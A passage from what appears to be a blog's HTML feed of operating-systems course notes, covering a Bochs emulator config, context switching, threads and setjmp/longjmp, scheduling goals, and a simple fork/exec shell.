class="line"><span class="comment"># 磁盘文件位置</span></span><br><span class="line">floppya: 1_44=/Users/larry/OSFromSratch/boot.img, status=inserted</span><br><span class="line"></span><br><span class="line"><span class="comment"># choose the boot disk. </span></span><br><span class="line">boot: floppy</span><br><span class="line"></span><br><span class="line"><span class="comment"># where do we send log messages?  </span></span><br><span class="line"><span class="built_in">log</span>: bochsout.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># disable the mouse</span></span><br><span class="line">mouse: enabled=0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable key mapping</span></span><br><span class="line"><span class="comment">#keyboard:keymap=$BXSHARE/keymaps/x11-pc-us.map</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># how much memory the emulated machine will have</span></span><br><span class="line">megs: 32</span><br></pre></td></tr></table></figure>
<p>一切准备就绪，启动模拟器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs -f bochsrc.txt</span><br></pre></td></tr></table></figure></p>
<p>按c成功进入<img src="http://or9a8nskt.bkt.clouddn.com/bochs_succ.png" alt="bochs_succ"></p>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[context switching]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-8-contect-switching/</url>
      <content type="html"><![CDATA[<h1 id="Context-Switching"><a href="#Context-Switching" class="headerlink" title="Context Switching"></a>Context Switching</h1><h2 id="Now-Why-Are-We-Doing-All-This-Stuff"><a href="#Now-Why-Are-We-Doing-All-This-Stuff" class="headerlink" title="Now: Why Are We Doing All This Stuff?"></a>Now: Why Are We Doing All This Stuff?</h2><ul>
<li>CPU multiplexing: a historical perspective.</li>
<li>Preemption and context switching.</li>
</ul>
<h2 id="CPU-Limitations-Number"><a href="#CPU-Limitations-Number" class="headerlink" title="CPU Limitations: Number"></a>CPU Limitations: Number</h2><p>(Historically) There is only one! Why?</p>
<ul>
<li>Potentially the most <strong>expensive</strong> and <strong>complex</strong> component of the system!</li>
</ul>
<p>(Recently) You may have many. Why?</p>
<ul>
<li>Multiple cores have emerged as a solution to <strong>thermal- and energy-management</strong> issues caused by transistor density.</li>
<li>But generally, even if you have more than one, there are <strong>fewer</strong> cores than tasks to be run.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/multicore.png" alt="multicore"></p>
<p>##CPU Limitations<br>How does the CPU compare to other parts of the system—memory, disks, etc.?</p>
<ul>
<li>It is <strong>way faster</strong>!</li>
<li><strong>Faster</strong> than <strong>memory</strong>—usually addressed on the processor through out-of-order execution.</li>
<li><strong>Way faster</strong> than <strong>disk</strong>—addressed by the operating system.</li>
<li><strong>Way faster</strong> than <strong>you</strong>!—partially addressed by the operating system. (Nothing the operating system can really do about your limitations.)</li>
</ul>
<h2 id="Human-Perceptual-Limitations"><a href="#Human-Perceptual-Limitations" class="headerlink" title="Human Perceptual Limitations"></a>Human Perceptual Limitations</h2><p>Can you express these delays to a 1 GHz processor?</p>
<ul>
<li>15 ms “rule of thumb”: 15,000,000 clock cycles!</li>
<li>40 ms based on 25 frames-per-second for “smooth” video: 40,000,000 clock cycles!</li>
<li>100 ms was the rule for old telephone systems, the delay point after which human conversation patterns start to break down: 100,000,000 clock cycles!</li>
</ul>
<h2 id="Ancient-History"><a href="#Ancient-History" class="headerlink" title="Ancient History"></a>Ancient History</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/TheHarvardMarkIcomputer.png" alt="TheHarvardMarkIcomputer"></p>
<h2 id="The-Garden"><a href="#The-Garden" class="headerlink" title="The Garden"></a>The Garden</h2><ul>
<li>Long long ago, in a land before time, computers did not multitask. <strong>They did one thing at a time</strong>.</li>
<li>That one thing had complete access to the machine in was running on.</li>
<li>The operating system—​if there was one—​was really just a library of routines to make programming easier. All abstractions, no multiplexing.</li>
</ul>
<h2 id="The-Fall-of-Computing"><a href="#The-Fall-of-Computing" class="headerlink" title="The Fall of Computing"></a>The Fall of Computing</h2><ul>
<li>At some point <strong>more people</strong> wanted to use the computer. That was annoying, because the geeks didn’t have it all to themselves anymore, but they just told people to form a line.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/PEOPLEINLINE.png" alt="People in line"></p>
<h2 id="The-Further-Fall-of-Computing"><a href="#The-Further-Fall-of-Computing" class="headerlink" title="The Further Fall of Computing"></a>The Further Fall of Computing</h2><ul>
<li>At some point people wanted to <strong>interact</strong> with the computer, even multiple people interacting with the computer <strong>at the same time</strong>! Now what were the geeks to do?</li>
</ul>
<h2 id="Give-the-Geeks-Some-Credit"><a href="#Give-the-Geeks-Some-Credit" class="headerlink" title="Give the Geeks Some Credit"></a>Give the Geeks Some Credit</h2><ul>
<li>They solved these problems by building <strong>operating systems</strong>. Scheduling evolved to meet the needs of computer users.</li>
</ul>
<h2 id="The-Rise-of-Multiprocessing"><a href="#The-Rise-of-Multiprocessing" class="headerlink" title="The Rise of Multiprocessing"></a>The Rise of Multiprocessing</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/schedulethehumans.png" alt="Schedule the humans"></p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/batchscheduling.png" alt="Batch scheduling"></p>
<ul>
<li><strong>Batch systems</strong> processed jobs in bulk, with predetermined input from files or other data sources. </li>
<li><strong>Interactive systems</strong> waited for input from users.</li>
</ul>
<h2 id="Problems-with-Batch-Scheduling"><a href="#Problems-with-Batch-Scheduling" class="headerlink" title="Problems with Batch Scheduling"></a>Problems with Batch Scheduling</h2><p>Recall one of the “problems” with the CPU</p>
<ul>
<li>It is <strong>faster</strong> than other system components!</li>
</ul>
<p>What problem does this create for simple batch scheduling?</p>
<ul>
<li><strong>Inefficiency</strong>! Usage of slower parts of the system will cause the CPU to stall waiting for them to finish.</li>
</ul>
<h2 id="Solution-Context-Switching"><a href="#Solution-Context-Switching" class="headerlink" title="Solution: Context Switching"></a>Solution: Context Switching</h2><p><img src="http://or9a8nskt.bkt.clouddn.com/contextswitching.png" alt="Contextsswitching"></p>
<h2 id="Birth-of-the-Operating-System"><a href="#Birth-of-the-Operating-System" class="headerlink" title="Birth of the Operating System"></a>Birth of the Operating System</h2><ul>
<li>Operating systems emerged partly to <strong>hide delays</strong> caused by slow devices to <strong>keep the processor active</strong>.</li>
<li>Hiding processor delays requires only <strong>cooperative scheduling</strong>: threads only stop running when they require a long-latency operation.</li>
</ul>
<h2 id="Supporting-Multiple-Interactive-Users"><a href="#Supporting-Multiple-Interactive-Users" class="headerlink" title="Supporting Multiple Interactive Users"></a>Supporting Multiple Interactive Users</h2><p>Supporting multiple users requires the notion that multiple tasks are running <strong>simultaneously</strong> or <strong>concurrently</strong>, either:</p>
<ul>
<li>One task per user for multiple users, or</li>
<li>multiple tasks for a single user, or</li>
<li>multiple tasks for multiple users.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/multiplejobs.png" alt="Multiple jobs"></p>
<h2 id="The-Illusion-of-Concurrency"><a href="#The-Illusion-of-Concurrency" class="headerlink" title="The Illusion of Concurrency"></a>The Illusion of Concurrency</h2><p>How is this accomplished?</p>
<ul>
<li>Remember human perceptual limits?</li>
<li>The processors <strong>rapidly</strong> switches between tasks creating the notion of concurrency!</li>
<li>We refer to these transitions as <strong>context switches</strong>.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/concurrencyfigure.png" alt="Concurrency"></p>
<h2 id="Implementing-Context-Switching"><a href="#Implementing-Context-Switching" class="headerlink" title="Implementing Context Switching"></a>Implementing Context Switching</h2><p>First problem: <strong>how does the operating system get control</strong>?</p>
<ul>
<li>Hardware interrupts.</li>
<li>Software interrupts.</li>
<li>Software exceptions.</li>
</ul>
<p><strong>But what if these things don’t happen?</strong></p>
<h2 id="Timer-Interrupts"><a href="#Timer-Interrupts" class="headerlink" title="Timer Interrupts"></a>Timer Interrupts</h2><ul>
<li><strong>Timer interrupts</strong> generated by a timer device ensure that the operating system regains control of the system at regular intervals.</li>
<li>Timer interrupts are the basis of <strong>preemptive scheduling</strong>: the operating system doesn’t wait for the thread to stop running, instead it preempts it.</li>
<li>Rest of interrupt handling is unchanged.</li>
</ul>
<h2 id="The-Illusion-of-Concurrency-1"><a href="#The-Illusion-of-Concurrency-1" class="headerlink" title="The Illusion of Concurrency"></a>The Illusion of Concurrency</h2><ul>
<li>Timer interrupts mean that a running thread may be stopped <strong>at any time</strong>.</li>
<li>When the thread restarts we want it to appear that nothing has happened, that execution was not interrupted.<ul>
<li>Of course other parts of the system might have changed, but the CPU state should be <strong>identical</strong>.</li>
</ul>
</li>
<li>How do we do this?</li>
</ul>
<h2 id="Saving-Thread-State"><a href="#Saving-Thread-State" class="headerlink" title="Saving Thread State"></a>Saving Thread State</h2><p>What does thread state consist of?</p>
<ul>
<li>Registers</li>
<li>Stack</li>
</ul>
<p>We rely on memory protection to keep the stack unchanged until we restart the thread.</p>
<h2 id="OS-161-Example"><a href="#OS-161-Example" class="headerlink" title="OS/161 Example"></a>OS/161 Example</h2><ul>
<li>Saving thread state is the <strong>first thing</strong> that happens when the interrupt service routine is triggered. (Why?)</li>
<li>Saved state is sometimes known as a <strong>trap frame</strong>.</li>
</ul>
<h2 id="Context-Switching-1"><a href="#Context-Switching-1" class="headerlink" title="Context Switching"></a>Context Switching</h2><ul>
<li>Threads switch to a separate kernel stack when executing in the kernel. Why?<ul>
<li>The kernel doesn’t trust (or want to pollute) the user thread’s stack.</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Threads and Thread Implementations]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-9-Threads-and-Thread-Implementations/</url>
      <content type="html"><![CDATA[<h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><p>So what is a thread?</p>
<ul>
<li>Registers</li>
<li>Stack</li>
</ul>
<p>How are each of the following shared between threads or processes?</p>
<ul>
<li>Registers</li>
<li>Stack</li>
<li>Memory</li>
<li>File descriptor table.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/thread.png" alt="thread"></p>
<h2 id="Why-Use-Threads"><a href="#Why-Use-Threads" class="headerlink" title="Why Use Threads?"></a>Why Use Threads?</h2><ol>
<li>Threads can be a good way of thinking about applications that do multiple things “simultaneously.”</li>
<li>Threads may naturally encapsulate some data about a certain thing that the application is doing.</li>
<li>Threads may help applications hide or parallelize delays caused by slow devices.</li>
</ol>
<h2 id="Threads-v-Processes-Part-II"><a href="#Threads-v-Processes-Part-II" class="headerlink" title="Threads v. Processes Part II"></a>Threads v. Processes Part II</h2><p>Good example from Wikipedia: multiple threads within a single process are like multiple cooks trying to prepare the same meal together.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/kitchen.png" alt="kitchen"></p>
<ul>
<li>Each one is doing one thing.</li>
<li>They are probably doing different things.</li>
<li>They all share the same recipe but may be looking at different parts of it.</li>
<li>They have private state but can communicate easily.</li>
<li>They must coordinate!</li>
</ul>
<h2 id="Meme"><a href="#Meme" class="headerlink" title="Meme"></a>Meme</h2><p>The OS corrupted<br>The cake</p>
<h2 id="Aside-Threads-v-Events"><a href="#Aside-Threads-v-Events" class="headerlink" title="Aside: Threads v. Events"></a>Aside: Threads v. Events</h2><ul>
<li>While threads are a reasonable way of thinking about concurrent programming, they are not the only way—​or even always the <em>best</em> way—​to make use of system resources.</li>
<li>Another approach is known as <a href="https://en.wikipedia.org/wiki/Event-driven_programming">event-driven programming</a>.</li>
<li>Anyone who has done JavaScript development or used frameworks like <a href="http://nodejs.org/">node.js</a> has grown familiar with this programming model.</li>
</ul>
<p>Events v. threads (over)simplified:</p>
<ul>
<li>Threads <strong>can block</strong>, so we make use of the CPU by switching between threads!</li>
<li>Event handlers <strong>cannot block</strong>, so we can make use of the CPU by simply running events until completion.</li>
</ul>
<h2 id="Naturally-Multithreaded-Applications"><a href="#Naturally-Multithreaded-Applications" class="headerlink" title="Naturally Multithreaded Applications"></a>Naturally Multithreaded Applications</h2><p>Web server:</p>
<ul>
<li>Use a separate thread to handle each incoming request.</li>
</ul>
<p>Web browser:</p>
<ul>
<li>Separate threads for each open tab.</li>
<li>When loading a page, separate threads to request and receive each<br>unique part of the page.</li>
</ul>
<p>Scientific applications:</p>
<ul>
<li>Divide-and-conquer “embarrassingly parallelizable” data sets.</li>
</ul>
<h2 id="Why-Not-Processes"><a href="#Why-Not-Processes" class="headerlink" title="Why Not Processes?"></a>Why Not Processes?</h2><ul>
<li>IPC is more difficult because the kernel tries to protect processes from each other.<ul>
<li>Inside a single process, anything goes!</li>
</ul>
</li>
<li>State (what?) associated with processes doesn’t scale well.</li>
</ul>
<h2 id="Implementing-Threads"><a href="#Implementing-Threads" class="headerlink" title="Implementing Threads"></a>Implementing Threads</h2><p>Threads can be implemented in user space by unprivileged libraries.</p>
<ul>
<li>This is the M:1 threading model, M user threads that look like 1 thread to the operating system kernel.</li>
</ul>
<p>Threads can be implemented by the kernel directly.</p>
<ul>
<li>This is the 1:1 threading model.</li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/thread1.png" alt="thread1"><br><img src="http://or9a8nskt.bkt.clouddn.com/thread2.png" alt="thread2"><br><img src="http://or9a8nskt.bkt.clouddn.com/thread3.png" alt="thread3"></p>
<h2 id="Implementing-Threads-in-User-Space"><a href="#Implementing-Threads-in-User-Space" class="headerlink" title="Implementing Threads in User Space"></a>Implementing Threads in User Space</h2><p>How is this possible?</p>
<ul>
<li>Doesn’t involve multiplexing between processes so no kernel privilege required!</li>
</ul>
<p>How do I:</p>
<ul>
<li><strong>Save and restore context?</strong> This is just saving and restoring registers. The C library has an implementation called <code>setjmp()</code>/<code>longjmp()</code></li>
<li><strong>Preempt other threads?</strong> Use periodic signals delivered by the operating system to activate a user space thread scheduler.</li>
</ul>
<h2 id="Aside-setjmp-longjmp-Wizardry"><a href="#Aside-setjmp-longjmp-Wizardry" class="headerlink" title="Aside: setjmp()/longjmp() Wizardry"></a>Aside: setjmp()/longjmp() Wizardry</h2><p>What will the following code do?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">nt <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">void</span> * argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, restored = <span class="number">0</span>;</span><br><span class="line">  jump_buf saved;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Value of i is now %d\n"</span>, i);</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"OK, saving state...\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> (setjmp(saved) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Saved CPU state.\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Restored CPU state.\n"</span>);</span><br><span class="line">        restored = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!restored) &#123;</span><br><span class="line">    longjmp(saved, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Value of i is now 0</span><br><span class="line">Value of i is now 1</span><br><span class="line">Value of i is now 2</span><br><span class="line">Value of i is now 3</span><br><span class="line">Value of i is now 4</span><br><span class="line">Value of i is now 5</span><br><span class="line">OK, saving state...</span><br><span class="line">Saved CPU state.</span><br><span class="line">Restored CPU state.</span><br><span class="line">Value of i is now 6</span><br><span class="line">Value of i is now 7</span><br><span class="line">Value of i is now 8</span><br><span class="line">Value of i is now 9</span><br></pre></td></tr></table></figure>
<ul>
<li>Use these tricks to impress your (new) friends!</li>
<li>(Or get rid of old ones…​)</li>
</ul>
<h2 id="Comparing-Threading-Implementations"><a href="#Comparing-Threading-Implementations" class="headerlink" title="Comparing Threading Implementations"></a>Comparing Threading Implementations</h2><p><strong>M:1 (user space) threading</strong></p>
<p>Pros:</p>
<ul>
<li>Threading operations are much faster because they do not have to cross the user/kernel boundary.</li>
<li>Thread state can be smaller.</li>
</ul>
<p>Cons:</p>
<ul>
<li>Can’t use multiple cores!</li>
<li>Operating system may not schedule the application correctly because it doesn’t know about the fact that it contains more than one thread.</li>
<li>A single thread may block the entire process in the kernel when there are other threads that could run.</li>
</ul>
<p><strong>1:1 (kernel) threading</strong><br>Pros:</p>
<ul>
<li>Scheduling might improve because kernel can schedule all threads in the process.</li>
</ul>
<p>Cons:</p>
<ul>
<li>Context switch overhead for all threading operations.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Introduction to scheduling]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-10-Introduction-to-scheduling/</url>
      <content type="html"><![CDATA[<h2 id="Thread-States"><a href="#Thread-States" class="headerlink" title="Thread States"></a>Thread States</h2><p>We talk about threads—and sometimes the processes containing them—as being in several different states:</p>
<ul>
<li><strong>Running</strong>: executing instructions on a CPU core.</li>
<li><strong>Ready</strong>: not executing instructions but capable of being restarted.</li>
<li><strong>Waiting, Blocked or Sleeping</strong>: not executing instructions and not able to be restarted until some event occurs.</li>
</ul>
<h2 id="Thread-State-Transitions"><a href="#Thread-State-Transitions" class="headerlink" title="Thread State Transitions"></a>Thread State Transitions</h2><ul>
<li>Running → Ready: a thread was <strong>descheduled</strong>.</li>
<li>Running → Waiting: a thread performed a <strong>blocking system call</strong>.</li>
<li>Waiting → Ready: the event the thread was waiting for happened.</li>
<li>Ready → Running: a thread was <strong>scheduled</strong>.</li>
<li>Running → Terminated: a thread <strong>exited</strong> or hit a fatal <strong>exception</strong>.</li>
</ul>
<p>Operating systems have data structures to organize threads into these groups which you encountered during ASST1.</p>
<h2 id="Scheduling-What"><a href="#Scheduling-What" class="headerlink" title="Scheduling: What?"></a>Scheduling: What?</h2><p>What is scheduling?</p>
<ul>
<li><strong>Scheduling</strong> is the process of choosing the next thread (or threads) to run on the CPU (or CPUs).</li>
<li>We will primarily discuss <strong>single core</strong> scheduling for most of the week but return to multi-core scheduling issues later.</li>
</ul>
<h2 id="Scheduling-Why"><a href="#Scheduling-Why" class="headerlink" title="Scheduling: Why?"></a>Scheduling: Why?</h2><p>Why schedule threads?</p>
<ul>
<li><strong>CPU multiplexing</strong>: we have more threads that cores to run them on.</li>
<li><strong>Kernel privilege</strong>: we are in charge of allocating the CPU and must try to make good decisions. <strong>Applications rely on it.</strong></li>
</ul>
<h2 id="Scheduling-When"><a href="#Scheduling-When" class="headerlink" title="Scheduling: When?"></a>Scheduling: When?</h2><p>When does scheduling happen?</p>
<ul>
<li>When a thread <strong>voluntarily</strong> gives up the CPU by calling <code>yield()</code>.</li>
<li>When a thread makes a blocking <strong>system call</strong> and must sleep until the call completes.</li>
<li>When a thread <strong>exits</strong>.</li>
<li>When the <strong>kernel decides</strong> that a thread has run for long enough.</li>
<li><code>#4</code> is what makes a scheduling policy <strong>preemptive</strong>, as opposed to <strong>cooperative</strong>: the kernel can preempt (or stop) a thread that has not requested to be stopped.</li>
</ul>
<h2 id="Why-yield"><a href="#Why-yield" class="headerlink" title="Why yield()?"></a>Why <code>yield()</code>?</h2><p>What is the rationale behind having a way for threads to voluntarily give up the CPU?</p>
<ul>
<li><code>yield()</code> can be a useful way of allowing a well-behaved thread to tell the CPU that it has no more useful work to do.</li>
<li><code>yield()</code> is inherently cooperative. “Let me get out of the way so that another, more useful, thread can run.”</li>
</ul>
<h2 id="Scheduling-How"><a href="#Scheduling-How" class="headerlink" title="Scheduling: How?"></a>Scheduling: How?</h2><p>Two separate questions here:</p>
<ul>
<li><strong>Mechanism</strong>: how do we switch between threads?</li>
<li><strong>Policy</strong>: how do we choose the next thread to run?</li>
</ul>
<p>How do we <strong>switch between threads</strong>?</p>
<ul>
<li>Perform a <strong>context switch</strong> and move threads between the <strong>ready, running,</strong> and <strong>waiting</strong> queues.</li>
</ul>
<h2 id="Policy-v-Mechanism"><a href="#Policy-v-Mechanism" class="headerlink" title="Policy v. Mechanism"></a>Policy v. Mechanism</h2><p>Scheduling is as example of useful separation between <strong>policy</strong> and <strong>mechanism</strong>:</p>
<ul>
<li>P: deciding what thread to run.</li>
<li>M: context switch.</li>
<li>M: maintaining the running, ready and waiting queues.</li>
<li>P: giving preference to interactive tasks.</li>
<li>M: using timer interrupts to stop running threads.</li>
<li>P: choosing a thread to run at random.</li>
</ul>
<h2 id="Scheduling-Matters"><a href="#Scheduling-Matters" class="headerlink" title="Scheduling Matters"></a>Scheduling Matters</h2><p>How the CPU is scheduled impacts <strong>every other part</strong> of the system.</p>
<p>Why?</p>
<ul>
<li>Using other system resources requires the CPU!</li>
<li><strong>Intelligent scheduling</strong> makes a modestly-powered system seem fast and responsive.</li>
<li><strong>Stupid scheduling</strong> makes a powerful system seem sluggish and laggy.</li>
</ul>
<h2 id="Human-Computer-Interaction-and-Expectations"><a href="#Human-Computer-Interaction-and-Expectations" class="headerlink" title="Human-Computer Interaction (and Expectations)"></a>Human-Computer Interaction (and Expectations)</h2><p>What do you expect from your machine?</p>
<ul>
<li><strong>Respond</strong> (Click)</li>
<li><strong>Continue</strong> (Watch, or active waiting)</li>
<li><strong>Finish</strong> (Expect, or passive waiting)</li>
</ul>
<h2 id="Respond-Click"><a href="#Respond-Click" class="headerlink" title="Respond (Click)"></a>Respond (Click)</h2><p><strong>Responsiveness</strong>: when you give the computer and instruction, or input, <strong>it responds in a timely manne</strong>r.</p>
<ul>
<li>It may <strong>not</strong> finish, but at least you know it has <strong>started</strong> (or understood).</li>
</ul>
<p>Most of what we do with computers consists of responsive tasks. This is <strong>using</strong> a computer, and what makes computers different from television.</p>
<p>Examples of responsive tasks:</p>
<ul>
<li>Web browsing: when a link is clicked, retrieve the web page.</li>
<li>Editing: when I enter text at the keyboard, place it at the cursor.</li>
<li>Chatting: when I hit send, transmit the text to my chat partner.</li>
</ul>
<h2 id="Continue-Watch"><a href="#Continue-Watch" class="headerlink" title="Continue (Watch)"></a>Continue (Watch)</h2><p><strong>Continuity</strong>: when you ask the computer to perform a continuous task it does so smoothly.</p>
<ul>
<li>Continuity implies <strong>active waiting</strong>: you are not interacting with the computer, but you are expecting it to continue to perform a task you have initiated.</li>
</ul>
<p>As computers have started to deliver media, this function is <strong>increasingly important</strong>.</p>
<p>Examples of continuous tasks:</p>
<ul>
<li>Blinking a cursor.</li>
<li>Playing music or a movie.</li>
<li>Stupid (!) web animations.</li>
</ul>
<h2 id="Finish-Expect"><a href="#Finish-Expect" class="headerlink" title="Finish (Expect)"></a>Finish (Expect)</h2><p><strong>Completion</strong>: when we ask to the computer to perform a task—or it performs one on our behalf—that we expect to take a long time, we want it to complete eventually.</p>
<ul>
<li>Completion implies <strong>passive waiting</strong>: you are asking the computer to continue to deliver interactive performance while working on your long-running task. (We also consider these background tasks.)</li>
<li>Unlike responsive and continuous task, background tasks may not be user initiated.</li>
</ul>
<p>Examples of background tasks:</p>
<ul>
<li>Performing a system backup.</li>
<li>Indexing files on my computer.</li>
</ul>
<h2 id="Click-Watch-Expect"><a href="#Click-Watch-Expect" class="headerlink" title="Click, Watch, Expect"></a>Click, Watch, Expect</h2><p>Many applications <strong>combine</strong> all three system expectations.</p>
<p>Music player:</p>
<ul>
<li>Click: change tracks.</li>
<li>Watch: play the selected track.</li>
<li>Finish: update album artwork.</li>
</ul>
<p>Web browser:</p>
<ul>
<li>Click: follow a link.</li>
<li>Watch: play web video.</li>
<li>Finish: index search history.</li>
</ul>
<h2 id="Conflicting-Goals"><a href="#Conflicting-Goals" class="headerlink" title="Conflicting Goals"></a>Conflicting Goals</h2><p>Scheduling is a balance between <strong>meeting deadlines</strong> and <strong>optimizing resource allocation</strong>:</p>
<ul>
<li>Optimal resource allocation: carefully allocate tasks so that all resources are constantly in used.</li>
<li>Meeting deadlines: drop everything and do this <strong>now</strong>!</li>
</ul>
<p>Responsiveness and continuity require meeting deadlines—unpredictable or predictable:</p>
<ul>
<li><strong>Responsiveness</strong> → unpredictable deadlines. “When the user moves the mouse I need to be ready to redraw the cursor.”</li>
<li><strong>Continuity</strong> → predictable deadlines. “Every 5 ms I need to write more data to the sound card buffer.”</li>
</ul>
<p>Throughput requires careful resource allocation:</p>
<ul>
<li><strong>Throughput</strong> → optimal resource allocation. “I should really give the backup process more resources so that it can finish overnight.”</li>
</ul>
<h2 id="Deadlines-Win"><a href="#Deadlines-Win" class="headerlink" title="Deadlines Win"></a>Deadlines Win</h2><p>Humans are sensitive to <strong>responsiveness</strong> and <strong>continuity</strong>.</p>
<ul>
<li>We don’t notice resource allocation (as much).</li>
<li>Heard: “My computer feels slow.”</li>
<li>Unheard: “My computer is not using all of its RAM.”</li>
</ul>
<p><strong>Why</strong>:</p>
<ul>
<li>Poor responsiveness or continuity wastes our time! (“The mouse jumped all over and I couldn’t click anywhere.”, “The movie kept stalling and I couldn’t watch it.”)</li>
<li>Poor throughput usually just wastes computer time. (“The backup took 12 hours but I was sleeping.”)</li>
</ul>
<h2 id="Scheduling-Goals"><a href="#Scheduling-Goals" class="headerlink" title="Scheduling Goals"></a>Scheduling Goals</h2><p>(Or, how to <strong>evaluate schedulers</strong>.)</p>
<ul>
<li>How well does it meet deadlines—unpredictable or predictable?</li>
<li>How completely does it allocate system resources?</li>
<li>No point having idle CPU, memory, or disk bandwidth when something useful could be happening.</li>
</ul>
<p>On human-facing systems, deadlines (or <strong>interactivity</strong>) usually wins. Why?</p>
<ul>
<li>Your time is more valuable than your computer’s.</li>
</ul>
<h2 id="Aside-Realtime-Scheduling"><a href="#Aside-Realtime-Scheduling" class="headerlink" title="(Aside) Realtime Scheduling"></a>(Aside) Realtime Scheduling</h2><p>We have established that deadlines are important to human-facing systems. This is mainly because systems that don’t meet deadlines are <strong>annoying</strong>. (“Buffering…​”, “Buffering…​”, etc.)</p>
<p>There are other classes of systems where the failure to meet deadlines can be <strong>fatal</strong>.</p>
<ul>
<li>“I meant to get around to running the motion_stop task 1 s ago, but I didn’t quite make it. And…​the robot rolled off of the cliff.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> OS </category>
            
            <category> CSE521 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> OS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Interrupt and Exception Handling]]></title>
      <url>/wiki/2017/07/30/OS-CSE521-7-Interrupt-and-Exception-Handling/</url>
      <content type="html"><![CDATA[<h2 id="Our-Simple-Shell"><a href="#Our-Simple-Shell" class="headerlink" title="Our Simple Shell"></a>Our Simple Shell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Disclaimer: this is C-like pseudo-code.</span></span><br><span class="line"><span class="comment"> It will not compile or run! (But it’s not far off.) */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  input = readLine();</span><br><span class="line">  returnCode = fork();</span><br><span class="line">  <span class="keyword">if</span> (returnCode == <span class="number">0</span>) &#123;</span><br><span class="line">    exec(input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exec-Challenges"><a href="#exec-Challenges" class="headerlink" title="exec() Challenges"></a><code>exec()</code> Challenges</h2><p>The most challenging part of <code>exec()</code> is making sure that, on failure, <code>exec()</code> can return to the calling process!</p>
<ul>
<li>Can’t make destructive changes to the parent’s address space until we are sure that things will success.</li>
<li>Of course, the process is just an abstraction anyway and that provides a lot of flexibility: can prepare a separate address space and just swap it in when we’re done.</li>
</ul>
<h2 id="exit-End-of-Life-Issues"><a href="#exit-End-of-Life-Issues" class="headerlink" title="exit() # End of Life Issues"></a><code>exit()</code> # End of Life Issues</h2><ul>
<li>What’s missing here? <strong>Death</strong>!</li>
<li>Processes choose the moment of their own end by calling <code>exit()</code>.</li>
